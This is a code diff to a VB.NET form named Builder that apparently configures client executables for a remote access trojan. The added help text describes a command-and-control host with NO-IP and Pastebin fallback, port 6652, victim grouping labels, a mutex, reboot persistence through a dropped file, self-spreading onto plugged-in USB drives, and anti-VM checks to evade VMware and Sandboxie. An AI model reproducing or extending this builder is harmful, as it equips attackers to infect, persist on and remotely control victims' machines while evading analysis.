@@ -7,6 +7,15 @@ Public Class Builder
 
     Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click
 
+        If host.Text.ToLower.Contains("pastebin.com".ToLower) AndAlso Not host.Text.ToLower.Contains("/raw/".ToLower) Then
+            MsgBox("Your pastebin should be like this https://pastebin.com/raw/asdf123")
+            Return
+        End If
+
+        If host2.Text.ToLower.Contains("pastebin.com".ToLower) AndAlso Not host2.Text.ToLower.Contains("/raw/".ToLower) Then
+            MsgBox("Your pastebin should be like this https://pastebin.com/raw/asdf123")
+            Return
+        End If
 
         If (host2.Text = "") Then
             host2.Text = ""
@@ -175,5 +184,23 @@ Public Class Builder
         exename.Enabled = False
         DRPATH.Enabled = False
         CHKDR.Checked = False
+    End Sub
+
+    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
+        MsgBox("
+DNS - IP = You can put your NO-IP or IP address
+
+Backup DNS = in case your IP or NO-IP has changed, this will be connected automatically, you can also use Pastebin to change your IP manually ex. https://pastebin.com/raw/PDC3d2bU
+
+PORT = Your port. the default is 6652
+
+Controller ID = You group name. ex. School, or ex. Company
+
+Mutex = Prevent your client to run twice
+
+Drop file = It will make sure that you client.exe will run after PC is restarted
+
+MISC = Spreading your client.exe on any USB that is plugged-in, Also Anti-VM will prevent your client.exe to run on VMware or Sandboxie or XP machines
+")
     End Sub
 End Class
